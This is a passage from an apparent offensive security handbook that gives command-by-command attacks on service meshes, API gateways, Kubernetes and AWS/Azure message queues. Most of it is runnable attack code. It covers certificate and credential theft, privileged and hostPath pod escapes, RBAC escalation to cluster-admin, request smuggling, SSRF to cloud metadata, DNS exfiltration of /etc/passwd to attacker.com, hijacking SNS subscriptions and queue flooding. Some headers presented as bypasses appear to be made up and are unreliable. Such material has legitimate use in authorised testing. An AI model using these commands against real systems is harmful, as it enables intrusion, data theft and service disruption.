curl http://istio-pilot.istio-system:8080/debug/configz | jq .

# List virtual services
kubectl get virtualservices -A
kubectl get destinationrules -A
kubectl get gateways -A

# Export Istio configuration
kubectl get virtualservice -n default SERVICE_NAME -o yaml

# Citadel certificate authority
curl http://istio-citadel.istio-system:8060/metrics
```

**Envoy Admin Interface Exploitation**

```bash
# Access Envoy admin interface (usually port 15000)
curl http://POD_IP:15000/

# Configuration dump
curl http://POD_IP:15000/config_dump | jq .

# List clusters
curl http://POD_IP:15000/clusters

# Statistics
curl http://POD_IP:15000/stats

# List listeners
curl http://POD_IP:15000/listeners

# Certificate information
curl http://POD_IP:15000/certs | jq .

# Runtime modifications
curl -X POST http://POD_IP:15000/logging?level=debug

# Drain connections (DoS)
curl -X POST http://POD_IP:15000/drain_listeners
```

**mTLS Bypass**

```bash
# Check if mTLS is enforced
kubectl get peerauthentication -A

# Test connection without client certificate
curl -k https://service.namespace.svc.cluster.local:443/api/endpoint

# Bypass using permissive mode
curl http://service.namespace.svc.cluster.local:8080/api/endpoint

# Check authentication policy
kubectl get peerauthentication default -n namespace -o yaml

# Test if service accepts both mTLS and plaintext
curl http://service.namespace.svc.cluster.local/endpoint
curl -k --cert client.crt --key client.key \
     https://service.namespace.svc.cluster.local/endpoint
```

**Authorization Policy Bypass**

```bash
# List authorization policies
kubectl get authorizationpolicies -A

# Check policy for service
kubectl get authorizationpolicy -n namespace POLICY_NAME -o yaml

# Test bypass with different HTTP methods
curl -X GET http://service.namespace:8080/admin
curl -X POST http://service.namespace:8080/admin
curl -X HEAD http://service.namespace:8080/admin

# Header manipulation
curl -H "X-Forwarded-For: 127.0.0.1" http://service:8080/admin
curl -H "X-Istio-Attributes: internal" http://service:8080/admin

# Path traversal
curl http://service:8080/api/../admin
curl http://service:8080/api/%2e%2e/admin
```

**Sidecar Injection Bypass**

```bash
# Check if sidecar is injected
kubectl get pod POD_NAME -o jsonpath='{.spec.containers[*].name}'

# Deploy pod without sidecar injection
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: bypass-pod
  annotations:
    sidecar.istio.io/inject: "false"
spec:
  containers:
  - name: app
    image: alpine
    command: ["/bin/sh"]
EOF

# Access services directly bypassing mesh
kubectl exec -it bypass-pod -- wget -qO- http://service.namespace:8080
```

### Linkerd Exploitation

**Linkerd Control Plane Access**

```bash
# Access Linkerd dashboard
kubectl -n linkerd port-forward svc/linkerd-web 8084:8084

# Linkerd API
curl http://linkerd-controller-api.linkerd:8085/api/v1/Version

# Tap API (intercept traffic)
linkerd tap deployment/SERVICE_NAME -n namespace

# Get metrics
curl http://linkerd-prometheus.linkerd:9090/api/v1/query?query=request_total

# List all meshed services
linkerd stat deployments -A
```

**Traffic Tap Exploitation**

```bash
# Tap specific service traffic
linkerd tap deployment/auth-service -n production --output json

# Filter for specific paths
linkerd tap deployment/auth-service --path /login

# Watch for authentication tokens
linkerd tap deployment/api-gateway | grep -i "authorization\|bearer"

# Export to file
linkerd tap deployment/payment-service -o json > payment_traffic.json

# Analyze captured traffic
jq '.http.requestInit.headers[] | select(.name=="Authorization")' payment_traffic.json
```

**Service Profile Manipulation**

[Inference] Modifying service profiles may allow traffic policy bypasses if RBAC is misconfigured:

```bash
# Get service profile
kubectl get serviceprofile -n namespace SERVICE_NAME.namespace.svc.cluster.local -o yaml

# Modify retry policy for DoS
cat <<EOF | kubectl apply -f -
apiVersion: linkerd.io/v1alpha2
kind: ServiceProfile
metadata:
  name: target-service.namespace.svc.cluster.local
  namespace: namespace
spec:
  routes:
  - name: attack
    condition:
      pathRegex: /.*
    responseClasses:
    - condition:
        status:
          min: 500
          max: 599
      isFailure: false
    retries:
      budget: 1000
      isRetryable: true
EOF
```

### Consul Connect Exploitation

**Consul Connect Service Discovery**

```bash
# List Connect-enabled services
curl http://consul.target.com:8500/v1/agent/connect/ca/roots | jq .

# Get service intentions
curl http://consul.target.com:8500/v1/connect/intentions | jq .

# Read specific intention
curl http://consul.target.com:8500/v1/connect/intentions/SOURCE_SERVICE/DEST_SERVICE | jq .

# List proxies
curl http://consul.target.com:8500/v1/agent/services | \
     jq '.[] | select(.Kind=="connect-proxy")'
```

**Intention Bypass**

```bash
# Create allow intention
curl -X PUT http://consul.target.com:8500/v1/connect/intentions \
     -d '{
           "SourceName": "malicious-service",
           "DestinationName": "target-service",
           "Action": "allow"
         }'

# Update existing intention
curl -X PUT http://consul.target.com:8500/v1/connect/intentions/INTENTION_ID \
     -d '{"Action": "allow"}'

# Delete deny intention
curl -X DELETE http://consul.target.com:8500/v1/connect/intentions/INTENTION_ID
```

**Certificate Theft**

```bash
# Access service certificate
curl http://consul.target.com:8500/v1/agent/connect/ca/leaf/SERVICE_NAME | jq .

# Extract private key and certificate
curl http://consul.target.com:8500/v1/agent/connect/ca/leaf/SERVICE_NAME | \
     jq -r '.PrivateKeyPEM' > service.key

curl http://consul.target.com:8500/v1/agent/connect/ca/leaf/SERVICE_NAME | \
     jq -r '.CertPEM' > service.crt

# Use stolen certificate
curl --cert service.crt --key service.key \
     https://target-service.service.consul:8443/api/endpoint
```

### Service Mesh Traffic Interception

**Envoy Traffic Manipulation**

```bash
# Port forward to Envoy admin
kubectl port-forward POD_NAME 15000:15000

# Modify route configuration
curl -X POST http://localhost:15000/config_dump > original_config.json

# Edit and reload (if admin API allows)
# This is typically read-only, but misconfigurations exist

# Listener modification
curl -X POST http://localhost:15000/listeners/LISTENER_NAME/drain
```

**MITM Attack on Service Mesh**

[Inference] If mTLS is not properly enforced, traffic interception may be possible within the mesh:

```bash
# Deploy rogue pod in same namespace
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: mitm-pod
  namespace: target-namespace
spec:
  containers:
  - name: mitmproxy
    image: mitmproxy/mitmproxy
    command: ["mitmweb", "--listen-host", "0.0.0.0", "--web-host", "0.0.0.0"]
EOF

# Configure service to route through MITM proxy
kubectl edit service target-service

# Or use iptables redirect from privileged container
iptables -t nat -A PREROUTING -p tcp --dport 8080 \
         -j REDIRECT --to-port 8888
```

---

## API Gateway Bypass

### Kong API Gateway Exploitation

**Kong Admin API Access**

```bash
# Default admin API endpoint
curl http://kong-admin.target.com:8001/

# List all services
curl http://kong-admin.target.com:8001/services | jq .

# List routes
curl http://kong-admin.target.com:8001/routes | jq .

# List plugins
curl http://kong-admin.target.com:8001/plugins | jq .

# List consumers
curl http://kong-admin.target.com:8001/consumers | jq .

# Get consumer credentials
curl http://kong-admin.target.com:8001/consumers/CONSUMER_NAME/key-auth | jq .
curl http://kong-admin.target.com:8001/consumers/CONSUMER_NAME/jwt | jq .
```

**Kong Plugin Bypass**

```bash
# Identify enabled plugins
curl http://kong-admin.target.com:8001/plugins | jq '.data[].name'

# Test authentication plugin bypass
# Rate limiting bypass
curl -H "X-Kong-Limit-Bypass: true" http://api.target.com/endpoint

# JWT bypass with empty signature
curl -H "Authorization: Bearer eyJhbGc.eyJzdWI.}" http://api.target.com/endpoint

# API key bypass
curl -H "apikey: " http://api.target.com/endpoint
curl http://api.target.com/endpoint  # Missing key

# Test plugin ordering vulnerabilities
curl -H "X-Custom-Plugin-Override: skip-auth" http://api.target.com/endpoint
```

**Kong Route Manipulation**

```bash
# Add malicious route
curl -X POST http://kong-admin.target.com:8001/routes \
     -H "Content-Type: application/json" \
     -d '{
           "name": "bypass-route",
           "paths": ["/admin"],
           "service": {"id": "SERVICE_ID"},
           "strip_path": false
         }'

# Update existing route
curl -X PATCH http://kong-admin.target.com:8001/routes/ROUTE_ID \
     -H "Content-Type: application/json" \
     -d '{"paths": ["/admin", "/backdoor"]}'

# Disable authentication plugin for route
curl -X PATCH http://kong-admin.target.com:8001/routes/ROUTE_ID \
     -H "Content-Type: application/json"  
-d '{"plugins": []}'

# Delete rate limiting plugin

curl -X DELETE http://kong-admin.target.com:8001/plugins/PLUGIN_ID
````

**Kong Service Discovery Poisoning**

```bash
# Add malicious upstream target
curl -X POST http://kong-admin.target.com:8001/upstreams/UPSTREAM_NAME/targets \
     -d "target=attacker.com:8080" \
     -d "weight=1000"

# Create service pointing to internal resource
curl -X POST http://kong-admin.target.com:8001/services \
     -d "name=internal-ssrf" \
     -d "url=http://169.254.169.254/latest/meta-data/"

# Create route to expose it
curl -X POST http://kong-admin.target.com:8001/routes \
     -d "service.id=SERVICE_ID" \
     -d "paths[]=/internal"

# Access internal metadata
curl http://api.target.com/internal/iam/security-credentials/
````

### AWS API Gateway Bypass

**API Gateway Enumeration**

```bash
# Find API Gateway endpoints
curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/

# List stages
aws apigateway get-stages --rest-api-id API_ID

# Get API keys
aws apigateway get-api-keys --include-values

# Export API configuration
aws apigateway get-export \
    --rest-api-id API_ID \
    --stage-name prod \
    --export-type swagger swagger.json

# Get authorizers
aws apigateway get-authorizers --rest-api-id API_ID
```

**Lambda Authorizer Bypass**

```bash
# Test without authorization header
curl https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# Test with malformed token
curl -H "Authorization: Bearer invalid" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# Test with expired token
curl -H "Authorization: Bearer EXPIRED_TOKEN" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# Event injection to authorizer
curl -H "Authorization: Bearer token" \
     -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Amz-Source-Arn: arn:aws:execute-api:*:*:*" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
```

**API Gateway HTTP Header Manipulation**

```bash
# Host header injection
curl -H "Host: attacker.com" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# X-Forwarded-Host manipulation
curl -H "X-Forwarded-Host: internal-service.local" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# X-Amzn headers
curl -H "X-Amzn-Trace-Id: Root=1-override" \
     -H "X-Amzn-Request-Id: custom-id" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
```

**Resource Policy Bypass**

```bash
# Test source IP restrictions
curl https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# Via CloudFront (if whitelisted)
curl -H "X-Forwarded-For: CLOUDFRONT_IP" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# VPC endpoint bypass
# If resource policy allows specific VPC endpoint
curl -H "X-Amzn-Vpce-Id: vpce-WHITELIST_ID" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
```

**Stage Variable Injection**

[Unverified] Stage variables in Lambda integration may be exploitable if user input is incorporated:

```bash
# Test stage variable injection
curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint?stage=\${stageVariables.internalEndpoint}"

# HTTP parameter pollution
curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint?url=\${stageVariables.backendUrl}"
```

### Azure API Management (APIM) Bypass

**APIM Policy Exploitation**

```bash
# Access APIM management endpoint
curl https://APIM_NAME.management.azure-api.net/

# List APIs
az apim api list --resource-group RG_NAME --service-name APIM_NAME

# Get API policy
az apim api policy show \
    --resource-group RG_NAME \
    --service-name APIM_NAME \
    --api-id API_ID

# Test rate limiting bypass
for i in {1..1000}; do
    curl -H "Ocp-Apim-Subscription-Key: KEY" \
         https://APIM_NAME.azure-api.net/api/endpoint &
done
```

**Subscription Key Bypass**

```bash
# Test without subscription key
curl https://APIM_NAME.azure-api.net/api/endpoint

# Test with invalid key
curl -H "Ocp-Apim-Subscription-Key: invalid" \
     https://APIM_NAME.azure-api.net/api/endpoint

# Alternative header names
curl -H "Subscription-Key: KEY" \
     https://APIM_NAME.azure-api.net/api/endpoint

curl -H "Api-Key: KEY" \
     https://APIM_NAME.azure-api.net/api/endpoint

# Query parameter bypass
curl "https://APIM_NAME.azure-api.net/api/endpoint?subscription-key=KEY"
```

**Backend URL Manipulation**

```bash
# Inbound policy SSRF
curl https://APIM_NAME.azure-api.net/api/endpoint \
     -H "X-Backend-Url: http://169.254.169.254/metadata/instance"

# Backend override
curl https://APIM_NAME.azure-api.net/api/endpoint \
     -H "X-Forwarded-Host: internal-backend.local"

# Path manipulation
curl "https://APIM_NAME.azure-api.net/api/../admin/endpoint"
```

### Google Cloud Endpoints Bypass

**Endpoints Service Control**

```bash
# Enumerate endpoints
gcloud endpoints services list

# Describe endpoint
gcloud endpoints services describe SERVICE_NAME

# Get OpenAPI spec
gcloud endpoints services describe SERVICE_NAME --format=json | \
    jq -r '.serviceConfig.documentation.rules[].description'

# Test authentication bypass
curl https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint

# JWT bypass
curl -H "Authorization: Bearer eyJhbGc" \
     https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
```

**ESP (Extensible Service Proxy) Bypass**

```bash
# Direct backend access bypassing ESP
curl http://BACKEND_SERVICE:8080/api/endpoint

# Kubernetes internal DNS
curl http://backend-service.default.svc.cluster.local:8080/api/endpoint

# Test API key bypass
curl https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
curl -H "X-API-Key: invalid" \
     https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
```

### Traefik API Gateway Bypass

**Traefik Dashboard Access**

```bash
# Default dashboard endpoint
curl http://traefik.target.com:8080/dashboard/

# API endpoint
curl http://traefik.target.com:8080/api/rawdata

# Get routers
curl http://traefik.target.com:8080/api/http/routers | jq .

# Get services
curl http://traefik.target.com:8080/api/http/services | jq .

# Get middlewares
curl http://traefik.target.com:8080/api/http/middlewares | jq .
```

**Traefik Middleware Bypass**

```bash
# Test authentication middleware bypass
curl http://api.target.com/admin

# Header manipulation
curl -H "X-Forwarded-User: admin" http://api.target.com/admin
curl -H "X-Traefik-Override: true" http://api.target.com/admin

# Path prefix bypass
curl http://api.target.com//admin
curl http://api.target.com/api/../admin
curl "http://api.target.com/admin%2f"

# Host header manipulation
curl -H "Host: internal.target.com" http://api.target.com/admin
```

**Traefik Route Priority Exploitation**

```bash
# Identify route priorities
curl http://traefik.target.com:8080/api/http/routers | \
    jq '.[] | {name: .name, rule: .rule, priority: .priority}'

# Test overlapping routes with different priorities
curl http://api.target.com/api/users/admin
curl http://api.target.com/api/admin
curl "http://api.target.com/api/users/..%2fadmin"
```

### Nginx/OpenResty Gateway Bypass

**Lua Script Exploitation**

[Inference] Nginx with OpenResty may have vulnerabilities in custom Lua authentication scripts:

```bash
# Test Lua injection in headers
curl -H "X-Auth-Token: '; os.execute('id') --" \
     http://api.target.com/endpoint

# Bypass Lua authentication
curl -H "X-Auth-Token: nil" http://api.target.com/endpoint
curl -H "X-Auth-Token: " http://api.target.com/endpoint

# Boolean injection
curl -H "X-Auth-Token: true" http://api.target.com/endpoint
curl -H "X-Auth-Token: 1" http://api.target.com/endpoint
```

**Location Block Bypass**

```bash
# Standard request (blocked)
curl http://api.target.com/admin

# URL encoding
curl http://api.target.com/%61dmin
curl http://api.target.com/admin%2f

# Case manipulation (if case-insensitive)
curl http://api.target.com/Admin
curl http://api.target.com/ADMIN

# Path traversal
curl http://api.target.com/api/../admin
curl http://api.target.com/./admin

# Null byte (older Nginx versions)
curl "http://api.target.com/admin%00"
curl "http://api.target.com/admin%00.html"

# Double slash
curl http://api.target.com//admin
curl http://api.target.com/api//admin
```

**Nginx Variable Injection**

```bash
# Test if user input reaches Nginx variables
curl "http://api.target.com/api?url=http://attacker.com"

# $uri manipulation
curl "http://api.target.com/redirect?next=/admin"
curl "http://api.target.com/redirect?next=//attacker.com"

# $args manipulation
curl "http://api.target.com/api?debug=1&internal=true"
```

### HAProxy API Gateway Bypass

**HAProxy Stats Interface**

```bash
# Access stats interface
curl http://haproxy.target.com:8404/stats
curl -u admin:password http://haproxy.target.com:8404/stats

# CSV format
curl http://haproxy.target.com:8404/stats;csv

# JSON format (HAProxy 2.0+)
curl http://haproxy.target.com:8404/stats;json

# Disable server
curl -X POST "http://haproxy.target.com:8404/stats?action=disable&b=backend&s=server1"
```

**ACL Bypass**

```bash
# Test ACL bypass techniques
# Path-based ACL
curl http://api.target.com/admin
curl http://api.target.com/Admin
curl http://api.target.com/ADMIN
curl http://api.target.com//admin
curl http://api.target.com/./admin

# Header-based ACL
curl -H "X-Forwarded-For: 127.0.0.1" http://api.target.com/admin
curl -H "X-Real-IP: 10.0.0.1" http://api.target.com/admin

# Method-based ACL
curl -X POST http://api.target.com/read-only-endpoint
curl -X HEAD http://api.target.com/admin
```

**Backend Server Direct Access**

```bash
# Identify backend servers from stats
curl http://haproxy.target.com:8404/stats | grep -oP 'server\d+.*?:\d+'

# Direct connection bypassing HAProxy
curl http://backend1.internal:8080/admin
curl http://10.0.1.100:8080/admin

# DNS rebinding attack
# Point attacker.com to HAProxy IP initially
# Then rebind to internal backend IP
```

### API Gateway Path Normalization Bypass

**Path Traversal Variations**

```bash
# Standard path traversal
curl http://api.target.com/api/../admin
curl http://api.target.com/api/../../admin

# URL encoded
curl http://api.target.com/api/%2e%2e/admin
curl http://api.target.com/api/%2e%2e%2fadmin

# Double URL encoded
curl http://api.target.com/api/%252e%252e/admin

# Unicode encoding
curl http://api.target.com/api/%c0%ae%c0%ae/admin
curl http://api.target.com/api/%u002e%u002e/admin

# Mixed encoding
curl http://api.target.com/api/..%2fadmin
curl http://api.target.com/api/%2e./admin
```

**HTTP Request Smuggling**

```bash
# CL.TE (Content-Length vs Transfer-Encoding)
printf 'POST /api HTTP/1.1\r\n'\
'Host: api.target.com\r\n'\
'Content-Length: 48\r\n'\
'Transfer-Encoding: chunked\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'GET /admin HTTP/1.1\r\n'\
'Host: api.target.com\r\n'\
'\r\n' | nc api.target.com 80

# TE.CL (Transfer-Encoding vs Content-Length)
printf 'POST /api HTTP/1.1\r\n'\
'Host: api.target.com\r\n'\
'Content-Length: 4\r\n'\
'Transfer-Encoding: chunked\r\n'\
'\r\n'\
'5c\r\n'\
'GET /admin HTTP/1.1\r\n'\
'Host: api.target.com\r\n'\
'\r\n'\
'0\r\n'\
'\r\n' | nc api.target.com 80

# Using Burp Turbo Intruder or custom script
python3 smuggle.py --url http://api.target.com --type CL.TE
```

**HTTP/2 Smuggling**

```bash
# Install h2 tools
pip3 install h2

# H2 request with smuggled H1 request
python3 << 'EOF'
from h2.connection import H2Connection
import socket

sock = socket.create_connection(('api.target.com', 443))
# ... TLS wrapper ...

# Send H2 request with smuggled GET
conn = H2Connection()
conn.initiate_connection()

headers = [
    (':method', 'POST'),
    (':path', '/api'),
    (':authority', 'api.target.com'),
    ('content-length', '100'),
]

smuggled = "GET /admin HTTP/1.1\r\nHost: api.target.com\r\n\r\n"
conn.send_headers(1, headers)
conn.send_data(1, smuggled.encode())
EOF
```

### Gateway Response Manipulation

**Cache Poisoning**

```bash
# Host header poisoning
curl -H "Host: attacker.com" \
     -H "X-Forwarded-Host: attacker.com" \
     http://api.target.com/cached-resource

# Cache key manipulation
curl -H "X-Cache-Key: malicious" \
     http://api.target.com/endpoint

# Vary header exploitation
curl -H "User-Agent: poison" \
     -H "X-Original-URL: /admin" \
     http://api.target.com/cached-page
```

**Response Header Injection**

```bash
# CRLF injection in headers
curl "http://api.target.com/redirect?url=http://attacker.com%0d%0aX-Injected:%20header"

# Set-Cookie injection
curl "http://api.target.com/endpoint?param=value%0d%0aSet-Cookie:%20admin=true"

# Location header injection
curl "http://api.target.com/redirect?next=/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"
```

### Rate Limiting and Throttling Bypass at Gateway

**Distributed Attack from Gateway**

```bash
# Bypass gateway rate limits using multiple identifiers
#!/bin/bash
for i in {1..1000}; do
    # Rotate identifiers
    user_agent="Mozilla/5.0 (Bot $i)"
    ip="10.0.$((i/254)).$((i%254))"
    session="session_$RANDOM"
    
    curl -H "User-Agent: $user_agent" \
         -H "X-Forwarded-For: $ip" \
         -H "Cookie: PHPSESSID=$session" \
         http://api.target.com/endpoint &
done
wait
```

**Gateway-Specific Headers**

```bash
# Kong bypass
curl -H "X-Kong-Limit: 999999" http://api.target.com/endpoint

# AWS API Gateway
curl -H "X-Amzn-ApiGateway-Api-Key: OVERRIDE" \
     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint

# Azure APIM
curl -H "Ocp-Apim-Trace: true" \
     -H "Rate-Limit-Bypass: true" \
     https://APIM_NAME.azure-api.net/api/endpoint
```

---

## Kubernetes-Specific Exploitation

### Pod Security Context Abuse

**Privileged Escalation**

```bash
# Check current security context
kubectl get pod POD_NAME -o yaml | grep -A 10 securityContext

# Deploy privileged pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh"]
    stdin: true
    tty: true
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Access host filesystem
kubectl exec -it privileged-pod -- chroot /host
```

**HostPath Volume Exploitation**

```bash
# Mount host Docker socket
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: docker-socket-pod
spec:
  containers:
  - name: docker
    image: docker:latest
    command: ["/bin/sh"]
    stdin: true
    tty: true
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
EOF

# Control host Docker daemon
kubectl exec -it docker-socket-pod -- docker ps
kubectl exec -it docker-socket-pod -- docker run --privileged -v /:/host alpine
```

### RBAC Exploitation

**Role Enumeration**

```bash
# Check current permissions
kubectl auth can-i --list

# List all roles
kubectl get roles -A
kubectl get clusterroles

# Describe specific role
kubectl describe role ROLE_NAME -n NAMESPACE
kubectl describe clusterrole CLUSTER_ROLE_NAME

# Check bindings
kubectl get rolebindings -A
kubectl get clusterrolebindings

# Who can perform actions
kubectl auth can-i create pods --as=system:serviceaccount:default:default
kubectl auth can-i get secrets --as=USER_NAME
```

**Privilege Escalation via RBAC**

```bash
# Create malicious rolebinding
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate
  namespace: default
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

# Use elevated privileges
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN get secrets -A
```

### Network Policy Bypass

**Test Network Policies**

```bash
# List network policies
kubectl get networkpolicies -A

# Describe policy
kubectl describe networkpolicy POLICY_NAME -n NAMESPACE

# Test connectivity from pod
kubectl run test-pod --image=alpine --rm -it -- sh
# Inside pod:
wget -qO- http://restricted-service.namespace:8080
nc -zv restricted-service.namespace 8080
```

**Egress Bypass**

```bash
# DNS tunneling for egress bypass
kubectl exec -it POD_NAME -- sh
# Inside pod:
nslookup `base64 /etc/passwd | head -c50`.attacker.com

# ICMP tunneling
ping -c 1 -p $(echo "data" | xxd -p) attacker.com
```

---

## Important Related Topics

For comprehensive cloud-native security testing:

- **Container runtime exploitation (containerd, CRI-O)** - Runtime-specific vulnerabilities
- **Serverless function exploitation** - AWS Lambda, Azure Functions, GCP Cloud Functions security
- **Cloud provider metadata service exploitation** - IMDS vulnerabilities across AWS/Azure/GCP
- **Infrastructure as Code (IaC) analysis** - Terraform/CloudFormation/ARM template vulnerabilities
- **CI/CD pipeline exploitation** - Jenkins, GitLab CI, GitHub Actions security

---

## Message Queue Exploitation

### Amazon SQS (Simple Queue Service)

**SQS Enumeration**

```bash
# List all queues
aws sqs list-queues

# List queues in specific region
aws sqs list-queues --region us-east-1

# Get queue URL
aws sqs get-queue-url --queue-name [QUEUE-NAME]

# Get queue attributes
aws sqs get-queue-attributes \
  --queue-url [QUEUE-URL] \
  --attribute-names All

# Check dead letter queue configuration
aws sqs get-queue-attributes \
  --queue-url [QUEUE-URL] \
  --attribute-names RedrivePolicy
```

**Message Interception**

```bash
# Receive messages (does not delete)
aws sqs receive-message \
  --queue-url [QUEUE-URL] \
  --max-number-of-messages 10

# Receive with all attributes
aws sqs receive-message \
  --queue-url [QUEUE-URL] \
  --attribute-names All \
  --message-attribute-names All \
  --max-number-of-messages 10

# Long polling for messages
aws sqs receive-message \
  --queue-url [QUEUE-URL] \
  --wait-time-seconds 20 \
  --max-number-of-messages 10

# Peek at messages without changing visibility
aws sqs receive-message \
  --queue-url [QUEUE-URL] \
  --visibility-timeout 0
```

**Message Manipulation**

```bash
# Send malicious message
aws sqs send-message \
  --queue-url [QUEUE-URL] \
  --message-body '{"command":"inject","payload":"malicious_data"}'

# Send message with attributes
aws sqs send-message \
  --queue-url [QUEUE-URL] \
  --message-body "Test message" \
  --message-attributes '{
    "Type": {"DataType":"String","StringValue":"admin"},
    "Priority": {"DataType":"Number","StringValue":"999"}
  }'

# Send batch messages
aws sqs send-message-batch \
  --queue-url [QUEUE-URL] \
  --entries file://messages.json

# Delete message (after receiving receipt handle)
aws sqs delete-message \
  --queue-url [QUEUE-URL] \
  --receipt-handle [RECEIPT-HANDLE]
```

**Queue Poisoning**

```bash
# Flood queue with messages
for i in {1..1000}; do
  aws sqs send-message \
    --queue-url [QUEUE-URL] \
    --message-body "Flood message $i" &
done
wait

# Send oversized message (max 256KB)
dd if=/dev/urandom bs=256000 count=1 | base64 > large_payload.txt
aws sqs send-message \
  --queue-url [QUEUE-URL] \
  --message-body file://large_payload.txt
```

**Permission Enumeration**

```bash
# Get queue policy
aws sqs get-queue-attributes \
  --queue-url [QUEUE-URL] \
  --attribute-names Policy \
  --query 'Attributes.Policy' \
  --output text | jq '.'

# Check if queue allows public access
aws sqs get-queue-attributes \
  --queue-url [QUEUE-URL] \
  --attribute-names Policy \
  --output text | grep -i "Principal.*\*"
```

**Dead Letter Queue Exploitation**

```bash
# List messages in DLQ
aws sqs receive-message \
  --queue-url [DLQ-URL] \
  --max-number-of-messages 10 \
  --attribute-names All

# Redrive messages from DLQ to source
aws sqs start-message-move-task \
  --source-arn [DLQ-ARN] \
  --destination-arn [SOURCE-QUEUE-ARN]
```

**Continuous Message Monitoring**

```bash
#!/bin/bash
QUEUE_URL="[QUEUE-URL]"

while true; do
  messages=$(aws sqs receive-message \
    --queue-url "$QUEUE_URL" \
    --max-number-of-messages 10 \
    --wait-time-seconds 10 \
    --attribute-names All \
    --message-attribute-names All)
  
  if [ -n "$messages" ]; then
    echo "=== $(date) ==="
    echo "$messages" | jq '.'
    
    # Extract and delete messages
    echo "$messages" | jq -r '.Messages[]?.ReceiptHandle' | while read receipt; do
      aws sqs delete-message \
        --queue-url "$QUEUE_URL" \
        --receipt-handle "$receipt"
    done
  fi
  
  sleep 1
done
```

### Amazon SNS (Simple Notification Service)

**SNS Enumeration**

```bash
# List topics
aws sns list-topics

# Get topic attributes
aws sns get-topic-attributes \
  --topic-arn [TOPIC-ARN]

# List subscriptions
aws sns list-subscriptions

# List subscriptions for specific topic
aws sns list-subscriptions-by-topic \
  --topic-arn [TOPIC-ARN]
```

**Topic Subscription Hijacking**

```bash
# Subscribe email endpoint
aws sns subscribe \
  --topic-arn [TOPIC-ARN] \
  --protocol email \
  --notification-endpoint attacker@example.com

# Subscribe HTTP/HTTPS endpoint
aws sns subscribe \
  --topic-arn [TOPIC-ARN] \
  --protocol https \
  --notification-endpoint https://attacker.com/webhook

# Subscribe SQS queue
aws sns subscribe \
  --topic-arn [TOPIC-ARN] \
  --protocol sqs \
  --notification-endpoint [ATTACKER-QUEUE-ARN]

# Subscribe Lambda function
aws sns subscribe \
  --topic-arn [TOPIC-ARN] \
  --protocol lambda \
  --notification-endpoint [LAMBDA-ARN]
```

**Message Publishing**

```bash
# Publish message to topic
aws sns publish \
  --topic-arn [TOPIC-ARN] \
  --message "Malicious notification content"

# Publish with subject
aws sns publish \
  --topic-arn [TOPIC-ARN] \
  --subject "URGENT: Security Alert" \
  --message "Click here: http://malicious-site.com"

# Publish with message attributes
aws sns publish \
  --topic-arn [TOPIC-ARN] \
  --message "Test" \
  --message-attributes '{
    "Type": {"DataType":"String","StringValue":"critical"},
    "Priority": {"DataType":"Number","StringValue":"1"}
  }'

# Publish structured message (different per protocol)
aws sns publish \
  --topic-arn [TOPIC-ARN] \
  --message file://message.json \
  --message-structure json
```

**Topic Policy Exploitation**

```bash
# Get topic policy
aws sns get-topic-attributes \
  --topic-arn [TOPIC-ARN] \
  --query 'Attributes.Policy' \
  --output text | jq '.'

# Check for overly permissive policies
aws sns get-topic-attributes \
  --topic-arn [TOPIC-ARN] \
  --output text | grep -i "Principal.*\*"

# Modify topic policy (if permissions allow)
aws sns set-topic-attributes \
  --topic-arn [TOPIC-ARN] \
  --attribute-name Policy \
  --attribute-value file://policy.json
```

### Azure Service Bus

**Service Bus Enumeration**

```bash
# List namespaces
az servicebus namespace list

# List queues in namespace
az servicebus queue list \
  --namespace-name [NAMESPACE] \
  --resource-group [RG-NAME]

# List topics
az servicebus topic list \
  --namespace-name [NAMESPACE] \
  --resource-group [RG-NAME]

# List subscriptions for topic
az servicebus topic subscription list \
  --namespace-name [NAMESPACE] \
  --resource-group [RG-NAME] \
  --topic-name [TOPIC-NAME]

# Get queue properties
az servicebus queue show \
  --namespace-name [NAMESPACE] \
  --resource-group [RG-NAME] \
  --name [QUEUE-NAME]
```

**Connection String Exploitation**

```bash
# Get connection string
az servicebus namespace authorization-rule keys list \
  --namespace-name [NAMESPACE] \
  --resource-group [RG-NAME] \
  --name RootManageSharedAccessKey

# Queue-level connection string
az servicebus queue authorization-rule keys list \
  --namespace-name [NAMESPACE] \
  --resource-group [RG-NAME] \
